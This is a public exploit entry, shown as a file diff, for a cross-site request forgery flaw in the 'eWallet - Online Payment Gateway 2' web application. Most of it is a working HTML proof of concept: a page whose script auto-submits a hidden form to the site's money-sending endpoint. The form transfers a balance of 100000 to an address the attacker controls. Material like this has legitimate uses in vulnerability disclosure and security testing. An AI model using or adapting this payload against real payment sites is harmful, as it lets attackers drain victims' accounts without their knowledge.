@@ -1,0 +1,29 @@
+# Exploit Title:  eWallet - Online Payment Gateway 2 - Cross-Site Request Forgery
+# Date: 2018-05-23
+# Exploit Author: L0RD
+# Vendor Homepage: https://codecanyon.net/item/ewallet-online-payment-gateway/19316332?s_rank=1110
+# Version: 2
+# Tested on: Kali linux
+
+# POC :
+# eWallet - Online Payment Gateway 2 suffers from csrf vulnerability .
+# Attacker can send target account balance to his account .
+
+# Exploit :
+
+<html>
+<head>
+  <title>CSRF POC</title>
+</head>
+  <body>
+    <form action="http://idealbrothers.thesoftking.com/walletv2/account/Sent" method="POST">
+      <input type="hidden" name="sendto" value="lord&#64;yahoo&#46;com" />
+      <input type="hidden" name="amount" value="100000" />
+      <input type="hidden" name="charge" value="on" />
+      <input type="hidden" name="message" value="test" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
